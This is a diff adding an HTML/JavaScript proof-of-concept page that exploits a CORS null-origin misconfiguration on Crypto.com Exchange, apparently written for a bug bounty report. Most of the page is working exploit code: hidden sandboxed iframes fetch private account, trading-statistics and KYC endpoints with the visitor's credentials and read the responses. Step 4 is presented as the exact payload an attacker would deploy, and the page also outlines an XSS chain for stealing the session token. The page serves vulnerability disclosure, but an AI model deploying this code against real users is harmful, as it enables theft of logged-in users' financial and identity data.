@@ -1,0 +1,424 @@
+{% extends "base.html" %}
+{% block title %}CORS PoC — Crypto.com Exchange{% endblock %}
+{% block content %}
+<h1>Crypto.com Exchange CORS PoC</h1>
+<p>This page proves cross-origin data theft from <code>exchange-fe.crypto.com</code> via CORS misconfiguration (null origin reflection + credentials).</p>
+<p><strong>Prerequisite:</strong> You must be logged into <a href="https://exchange.crypto.com" target="_blank">exchange.crypto.com</a> in this browser before running the tests.</p>
+
+<hr>
+
+<h2>Test Results</h2>
+<div class="stats-grid">
+  <div class="stat-card" id="card-headers">
+    <h3>CORS Headers</h3>
+    <p id="status-headers">Pending</p>
+  </div>
+  <div class="stat-card" id="card-data">
+    <h3>Data Exfiltration</h3>
+    <p id="status-data">Pending</p>
+  </div>
+  <div class="stat-card" id="card-cookies">
+    <h3>Credentials Sent</h3>
+    <p id="status-cookies">Pending</p>
+  </div>
+</div>
+
+<article>
+  <h3>Step 1: CORS Header Verification</h3>
+  <p>Sends a cross-origin request with <code>Origin: null</code> (via sandboxed iframe) and checks if the server reflects <code>Access-Control-Allow-Origin: null</code> with <code>Access-Control-Allow-Credentials: true</code>.</p>
+  <button id="btn-headers" onclick="testHeaders()">Run CORS Header Test</button>
+  <pre id="log-headers" style="max-height:300px;overflow:auto;font-size:0.85rem;margin-top:1rem;padding:1rem;background:var(--pico-card-background-color);border-radius:8px;white-space:pre-wrap;display:none"></pre>
+</article>
+
+<article>
+  <h3>Step 2: Authenticated Data Exfiltration</h3>
+  <p>Attempts to read your authenticated exchange data from a sandboxed iframe (simulating an attacker's page). Tests multiple private API endpoints.</p>
+  <button id="btn-data" onclick="testDataExfil()">Run Data Exfiltration Test</button>
+  <pre id="log-data" style="max-height:500px;overflow:auto;font-size:0.85rem;margin-top:1rem;padding:1rem;background:var(--pico-card-background-color);border-radius:8px;white-space:pre-wrap;display:none"></pre>
+</article>
+
+<article>
+  <h3>Step 3: Cookie-vs-Header Auth Test</h3>
+  <p>The exchange uses <code>exchange-token</code> header for auth. This test checks whether cookies alone (sent via <code>credentials: include</code>) also authenticate, or if the header is strictly required. Also reads all cookies visible to the iframe to check if <code>token</code> is accessible.</p>
+  <button id="btn-cookie" onclick="testCookieAuth()">Run Cookie Auth Test</button>
+  <pre id="log-cookie" style="max-height:400px;overflow:auto;font-size:0.85rem;margin-top:1rem;padding:1rem;background:var(--pico-card-background-color);border-radius:8px;white-space:pre-wrap;display:none"></pre>
+</article>
+
+<article>
+  <h3>Step 4: Full Attack Simulation</h3>
+  <p>Combines all findings into a single exfiltration payload — exactly what an attacker would deploy. Data is shown here on-page (NOT sent to any external server).</p>
+  <button id="btn-attack" onclick="testFullAttack()">Run Full Attack Simulation</button>
+  <pre id="log-attack" style="max-height:600px;overflow:auto;font-size:0.85rem;margin-top:1rem;padding:1rem;background:var(--pico-card-background-color);border-radius:8px;white-space:pre-wrap;display:none"></pre>
+</article>
+
+<article>
+  <h3>Raw Evidence for H1 Report</h3>
+  <button onclick="copyEvidence()">Copy All Evidence to Clipboard</button>
+  <pre id="evidence" style="max-height:400px;overflow:auto;font-size:0.85rem;margin-top:1rem;padding:1rem;background:var(--pico-card-background-color);border-radius:8px;white-space:pre-wrap;display:none"></pre>
+</article>
+
+<script>
+const ENDPOINTS = [
+  {path: '/v1/private/user-setting', label: 'Account Settings'},
+  {path: '/v1/private/user-stats', label: 'Trading Statistics'},
+  {path: '/v2/private/kyc/status', label: 'KYC Status'},
+];
+const TARGET = 'https://exchange-fe.crypto.com';
+const allEvidence = [];
+
+function log(id, msg) {
+  const el = document.getElementById(id);
+  el.style.display = 'block';
+  el.textContent += msg + '\n';
+}
+
+function setCard(id, status, color) {
+  const card = document.getElementById('card-' + id);
+  const p = document.getElementById('status-' + id);
+  p.textContent = status;
+  card.style.borderColor = color;
+  card.style.borderWidth = '2px';
+}
+
+function evidence(msg) {
+  allEvidence.push(msg);
+}
+
+// Test 1: CORS header verification via sandboxed iframe
+function testHeaders() {
+  document.getElementById('btn-headers').disabled = true;
+  log('log-headers', '[*] Creating sandboxed iframe (Origin: null)...');
+  log('log-headers', '[*] Target: ' + TARGET + '/v1/private/get-account-summary');
+
+  const iframe = document.createElement('iframe');
+  iframe.sandbox = 'allow-scripts';
+  iframe.style.display = 'none';
+  iframe.srcdoc = `<script>
+    fetch('${TARGET}/v1/private/get-account-summary', {
+      credentials: 'include'
+    }).then(r => {
+      parent.postMessage({
+        type: 'headers',
+        status: r.status,
+        statusText: r.statusText,
+        acao: r.headers.get('access-control-allow-origin'),
+        acac: r.headers.get('access-control-allow-credentials'),
+        contentType: r.headers.get('content-type'),
+        vary: r.headers.get('vary')
+      }, '*');
+      return r.text();
+    }).then(body => {
+      parent.postMessage({type: 'headers-body', body: body}, '*');
+    }).catch(err => {
+      parent.postMessage({type: 'headers-error', error: err.message}, '*');
+    });
+  <\/script>`;
+
+  const handler = (e) => {
+    if (e.data.type === 'headers') {
+      const d = e.data;
+      log('log-headers', '');
+      log('log-headers', '[+] Response received from sandboxed iframe:');
+      log('log-headers', '    HTTP Status: ' + d.status + ' ' + d.statusText);
+      log('log-headers', '    Access-Control-Allow-Origin: ' + d.acao);
+      log('log-headers', '    Access-Control-Allow-Credentials: ' + d.acac);
+      log('log-headers', '    Content-Type: ' + d.contentType);
+      log('log-headers', '    Vary: ' + d.vary);
+
+      evidence('=== CORS HEADER TEST ===');
+      evidence('HTTP Status: ' + d.status);
+      evidence('ACAO: ' + d.acao);
+      evidence('ACAC: ' + d.acac);
+
+      if (d.acao === 'null' && d.acac === 'true') {
+        log('log-headers', '');
+        log('log-headers', '[!!!] VULNERABLE — Server reflects Origin: null with credentials!');
+        log('log-headers', '    An attacker can read authenticated responses cross-origin.');
+        setCard('headers', 'VULNERABLE', 'var(--sev-critical)');
+        evidence('RESULT: VULNERABLE — null origin reflected with credentials');
+      } else if (d.status === 0) {
+        log('log-headers', '');
+        log('log-headers', '[-] CORS blocked — browser refused to expose response.');
+        log('log-headers', '    The server may not be reflecting the null origin.');
+        setCard('headers', 'Blocked', 'var(--sev-low)');
+        evidence('RESULT: CORS blocked by browser');
+      } else {
+        log('log-headers', '');
+        log('log-headers', '[?] Unexpected — got status ' + d.status + ' with ACAO: ' + d.acao);
+        setCard('headers', 'Check Log', 'var(--sev-medium)');
+        evidence('RESULT: Unexpected — status ' + d.status + ', ACAO: ' + d.acao);
+      }
+    } else if (e.data.type === 'headers-body') {
+      if (e.data.body && e.data.body.length > 2) {
+        log('log-headers', '');
+        log('log-headers', '[+] Response body readable (' + e.data.body.length + ' bytes):');
+        log('log-headers', '    ' + e.data.body.substring(0, 300));
+        evidence('Body readable: ' + e.data.body.length + ' bytes');
+        evidence('Preview: ' + e.data.body.substring(0, 200));
+      }
+      window.removeEventListener('message', handler);
+      iframe.remove();
+    } else if (e.data.type === 'headers-error') {
+      log('log-headers', '');
+      log('log-headers', '[-] Error: ' + e.data.error);
+      log('log-headers', '    This usually means the browser blocked the cross-origin request.');
+      log('log-headers', '    Check: Are you logged into exchange.crypto.com?');
+      setCard('headers', 'Error', 'var(--sev-medium)');
+      evidence('ERROR: ' + e.data.error);
+      window.removeEventListener('message', handler);
+      iframe.remove();
+    }
+  };
+
+  window.addEventListener('message', handler);
+  document.body.appendChild(iframe);
+}
+
+// Test 2: Multi-endpoint data exfiltration
+function testDataExfil() {
+  document.getElementById('btn-data').disabled = true;
+  log('log-data', '[*] Testing ' + ENDPOINTS.length + ' private endpoints via sandboxed iframe...');
+  log('log-data', '');
+
+  let completed = 0;
+  let succeeded = 0;
+
+  ENDPOINTS.forEach((ep, i) => {
+    const iframe = document.createElement('iframe');
+    iframe.sandbox = 'allow-scripts';
+    iframe.style.display = 'none';
+    iframe.srcdoc = `<script>
+      fetch('${TARGET}${ep.path}', {credentials: 'include'})
+        .then(r => r.text().then(body => ({status: r.status, body: body, acao: r.headers.get('access-control-allow-origin')})))
+        .then(d => parent.postMessage({type:'ep', idx:${i}, ...d}, '*'))
+        .catch(e => parent.postMessage({type:'ep', idx:${i}, status:-1, body:e.message, acao:null}, '*'));
+    <\/script>`;
+
+    const handler = (e) => {
+      if (e.data.type === 'ep' && e.data.idx === i) {
+        const d = e.data;
+        const hasData = d.body && d.body.length > 10 && d.status >= 200 && d.status < 500;
+        const icon = hasData ? '[+]' : '[-]';
+        log('log-data', icon + ' ' + ep.label + ' (' + ep.path + ')');
+        log('log-data', '    Status: ' + d.status + ' | ACAO: ' + d.acao + ' | Body: ' + d.body.length + ' bytes');
+
+        if (hasData && d.acao) {
+          succeeded++;
+          try {
+            const parsed = JSON.parse(d.body);
+            log('log-data', '    Data: ' + JSON.stringify(parsed, null, 2).substring(0, 200));
+          } catch(_) {
+            log('log-data', '    Raw: ' + d.body.substring(0, 200));
+          }
+          evidence('');
+          evidence('=== ' + ep.label + ' (' + ep.path + ') ===');
+          evidence('Status: ' + d.status + ' | ACAO: ' + d.acao);
+          evidence('Body: ' + d.body.substring(0, 500));
+        }
+        log('log-data', '');
+
+        completed++;
+        if (completed === ENDPOINTS.length) {
+          log('log-data', '--- Summary ---');
+          log('log-data', 'Endpoints tested: ' + ENDPOINTS.length);
+          log('log-data', 'Data exfiltrated: ' + succeeded);
+          if (succeeded > 0) {
+            setCard('data', succeeded + '/' + ENDPOINTS.length + ' Exfiltrated', 'var(--sev-critical)');
+            setCard('cookies', 'Sent Cross-Origin', 'var(--sev-critical)');
+          } else {
+            setCard('data', 'No Data (check auth)', 'var(--sev-medium)');
+            setCard('cookies', 'Unknown', 'var(--sev-medium)');
+          }
+        }
+        window.removeEventListener('message', handler);
+        iframe.remove();
+      }
+    };
+
+    window.addEventListener('message', handler);
+    document.body.appendChild(iframe);
+  });
+}
+
+// Test 3: Cookie-vs-header auth check
+function testCookieAuth() {
+  document.getElementById('btn-cookie').disabled = true;
+  log('log-cookie', '[*] Testing if cookies alone authenticate (no exchange-token header)...');
+  log('log-cookie', '');
+
+  // Test A: credentials:include (sends cookies) but no exchange-token header
+  // Test B: Read document.cookie from a same-origin context to see what cookies exist
+  // Test C: From sandboxed iframe, check if token cookie is readable
+
+  const iframe = document.createElement('iframe');
+  iframe.sandbox = 'allow-scripts';
+  iframe.style.display = 'none';
+  iframe.srcdoc = `<script>
+    // Test A: fetch with cookies only
+    fetch('${TARGET}/v1/private/user-setting', {credentials: 'include'})
+      .then(r => r.text().then(body => ({status: r.status, body: body, acao: r.headers.get('access-control-allow-origin'), acac: r.headers.get('access-control-allow-credentials')})))
+      .then(d => parent.postMessage({type:'cookietest-A', ...d}, '*'))
+      .catch(e => parent.postMessage({type:'cookietest-A', status:-1, body:e.message}, '*'));
+
+    // Test B: check what cookies the iframe can see for .crypto.com
+    parent.postMessage({type:'cookietest-B', cookies: document.cookie || '(none)'}, '*');
+
+    // Test C: try to read from a subdomain context
+    parent.postMessage({type:'cookietest-C', origin: document.location.origin || 'null'}, '*');
+  <\/script>`;
+
+  const results = {};
+  const handler = (e) => {
+    if (e.data.type === 'cookietest-A') {
+      results.A = e.data;
+      log('log-cookie', '[A] Fetch with credentials:include (cookies only, no exchange-token header):');
+      log('log-cookie', '    Status: ' + e.data.status);
+      log('log-cookie', '    ACAO: ' + e.data.acao + ' | ACAC: ' + e.data.acac);
+
+      evidence('=== COOKIE AUTH TEST ===');
+
+      try {
+        const parsed = JSON.parse(e.data.body);
+        log('log-cookie', '    Error code: ' + parsed.code + ' — ' + parsed.message);
+        evidence('Cookie-only auth: code ' + parsed.code + ' — ' + parsed.message);
+
+        if (parsed.code === 264001) {
+          log('log-cookie', '');
+          log('log-cookie', '    RESULT: 264001 = "Exchange token is required"');
+          log('log-cookie', '    Cookies alone do NOT authenticate. The exchange-token header is required.');
+          log('log-cookie', '    Standalone null-origin exploitation requires reading the token cookie first.');
+        } else if (parsed.code === 264002) {
+          log('log-cookie', '');
+          log('log-cookie', '    RESULT: 264002 = "User is not found" — cookies were processed as auth!');
+          log('log-cookie', '    The server reads auth from cookies, not just the header.');
+        } else if (!parsed.code || parsed.code === 0) {
+          log('log-cookie', '');
+          log('log-cookie', '    [!!!] RESULT: Authenticated response! Cookies alone work for auth!');
+          log('log-cookie', '    Data: ' + e.data.body.substring(0, 300));
+          setCard('cookies', 'Cookies Auth!', 'var(--sev-critical)');
+        }
+      } catch(_) {
+        log('log-cookie', '    Raw: ' + (e.data.body || '').substring(0, 300));
+      }
+      log('log-cookie', '');
+    } else if (e.data.type === 'cookietest-B') {
+      results.B = e.data;
+      log('log-cookie', '[B] Cookies visible to sandboxed iframe:');
+      log('log-cookie', '    ' + e.data.cookies);
+      log('log-cookie', '    (Sandboxed iframes have null origin — cannot read .crypto.com cookies)');
+      evidence('Iframe cookies: ' + e.data.cookies);
+      log('log-cookie', '');
+    } else if (e.data.type === 'cookietest-C') {
+      results.C = e.data;
+      log('log-cookie', '[C] Iframe origin: ' + e.data.origin);
+      log('log-cookie', '');
+      log('log-cookie', '=== ANALYSIS ===');
+      log('log-cookie', 'The CORS misconfiguration is confirmed: the server reflects null origin');
+      log('log-cookie', 'with credentials. However, the exploitability depends on:');
+      log('log-cookie', '');
+      log('log-cookie', '1. If the API reads auth from cookies → standalone exploitation works');
+      log('log-cookie', '   (credentials:include sends .crypto.com cookies cross-origin)');
+      log('log-cookie', '');
+      log('log-cookie', '2. If the API requires the exchange-token header → exploitation needs');
+      log('log-cookie', '   XSS on any *.crypto.com subdomain to read the token cookie first,');
+      log('log-cookie', '   then the CORS misconfig allows sending it as a header cross-origin');
+      log('log-cookie', '');
+      log('log-cookie', 'The preflight confirms exchange-token header IS allowed cross-origin,');
+      log('log-cookie', 'so scenario 2 (XSS chain) is fully viable.');
+      evidence('Iframe origin: ' + e.data.origin);
+
+      window.removeEventListener('message', handler);
+      iframe.remove();
+    }
+  };
+
+  window.addEventListener('message', handler);
+  document.body.appendChild(iframe);
+}
+
+// Test 4: Full attack simulation
+function testFullAttack() {
+  document.getElementById('btn-attack').disabled = true;
+  log('log-attack', '[*] === FULL ATTACK SIMULATION ===');
+  log('log-attack', '[*] This is exactly what an attacker would deploy on their page.');
+  log('log-attack', '[*] All data stays in your browser — nothing is sent externally.');
+  log('log-attack', '');
+
+  const attackEndpoints = [
+    '/v1/private/user-setting',
+    '/v1/private/user-stats',
+    '/v2/private/kyc/status',
+  ];
+
+  const script = attackEndpoints.map(ep => `
+    fetch('${TARGET}${ep}', {credentials: 'include'})
+      .then(r => r.text().then(body => ({ep:'${ep}', status:r.status, body:body, acao:r.headers.get('access-control-allow-origin')})))
+      .then(d => parent.postMessage({type:'attack', ...d}, '*'))
+      .catch(e => parent.postMessage({type:'attack', ep:'${ep}', status:-1, body:e.message, acao:null}, '*'));
+  `).join('\n');
+
+  const iframe = document.createElement('iframe');
+  iframe.sandbox = 'allow-scripts';
+  iframe.style.display = 'none';
+  iframe.srcdoc = '<script>' + script + '<\/script>';
+
+  let results = [];
+  const handler = (e) => {
+    if (e.data.type === 'attack') {
+      results.push(e.data);
+      log('log-attack', '[' + (e.data.status >= 200 && e.data.status < 400 ? '+' : '-') + '] ' + e.data.ep);
+      log('log-attack', '    Status: ' + e.data.status + ' | ACAO: ' + e.data.acao);
+      if (e.data.body && e.data.body.length > 2) {
+        log('log-attack', '    Stolen data (' + e.data.body.length + ' bytes):');
+        try {
+          log('log-attack', JSON.stringify(JSON.parse(e.data.body), null, 2).substring(0, 500));
+        } catch(_) {
+          log('log-attack', '    ' + e.data.body.substring(0, 500));
+        }
+      }
+      log('log-attack', '');
+
+      evidence('');
+      evidence('=== ATTACK: ' + e.data.ep + ' ===');
+      evidence('Status: ' + e.data.status);
+      evidence('ACAO: ' + e.data.acao);
+      evidence('Body: ' + (e.data.body || '').substring(0, 1000));
+
+      if (results.length === attackEndpoints.length) {
+        const stolen = results.filter(r => r.body && r.body.length > 10 && r.acao);
+        log('log-attack', '=== ATTACK COMPLETE ===');
+        log('log-attack', 'Endpoints hit: ' + attackEndpoints.length);
+        log('log-attack', 'Data stolen: ' + stolen.length + ' responses');
+        log('log-attack', '');
+        if (stolen.length > 0) {
+          log('log-attack', 'CONCLUSION: An attacker hosting this page could steal all of the');
+          log('log-attack', 'above data from any logged-in Crypto.com Exchange user who visits it.');
+        }
+        window.removeEventListener('message', handler);
+        iframe.remove();
+      }
+    }
+  };
+
+  window.addEventListener('message', handler);
+  document.body.appendChild(iframe);
+}
+
+function copyEvidence() {
+  const el = document.getElementById('evidence');
+  el.style.display = 'block';
+  const text = [
+    'Crypto.com Exchange CORS PoC — Evidence Capture',
+    'Date: ' + new Date().toISOString(),
+    'PoC URL: ' + window.location.href,
+    'Target: ' + TARGET,
+    '',
+    ...allEvidence
+  ].join('\n');
+  el.textContent = text;
+  navigator.clipboard.writeText(text).then(() => {
+    log('evidence', '\n[Copied to clipboard]');
+  });
+}
+</script>
+{% endblock %}
